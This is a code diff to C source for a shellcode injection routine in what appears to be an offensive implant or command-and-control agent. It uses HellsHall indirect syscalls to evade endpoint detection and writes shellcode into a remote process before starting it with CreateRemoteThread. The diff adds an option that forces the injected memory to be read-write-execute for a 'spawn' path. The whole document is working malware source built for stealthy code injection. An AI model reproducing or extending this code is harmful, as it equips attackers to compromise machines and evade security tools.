@@ -10,7 +10,7 @@
 #ifdef INCLUDE_EVASION_HELLSHALL
 #include "evasion/hellshall.h"
 
-HANDLE inject_hellshall(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
+HANDLE inject_hellshall(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step, BOOL bForceRWX) {
     if (!inst->bHellsHallInit) {
         DBG(inst, "[INJECT] HellsHall not initialized, falling back to gate wrappers");
         // Fall back to CRT-style injection with gate_ wrappers
@@ -23,7 +23,8 @@ HANDLE inject_hellshall(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD 
         gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);
         if (step) *step = 23;
         DWORD old_protect = 0;
-        gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
+        gate_VirtualProtectEx(inst, hProcess, remote, sc_len,
+            bForceRWX ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ, &old_protect);
         if (step) *step = 24;
         return gate_CreateRemoteThread(inst,
             hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
@@ -60,11 +61,18 @@ HANDLE inject_hellshall(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD 
     PVOID protect_base = remote;
     SIZE_T protect_size = region_size;
     DWORD old_protect = 0;
+// spawn injects a raw PIC blob whose _start self-writes __Instance;
+    // bForceRWX is TRUE for spawn, FALSE for inject-into-pid.
+    DWORD new_protect;
+    if (bForceRWX) {
+        new_protect = PAGE_EXECUTE_READWRITE;
+    } else {
 #if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
-    DWORD new_protect = PAGE_EXECUTE_READ;
+        new_protect = PAGE_EXECUTE_READ;
 #else
-    DWORD new_protect = PAGE_EXECUTE_READWRITE;
+        new_protect = PAGE_EXECUTE_READWRITE;
 #endif
+    }
     status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtProtectVirtualMemory],
         hProcess, &protect_base, &protect_size, new_protect, &old_protect);
 
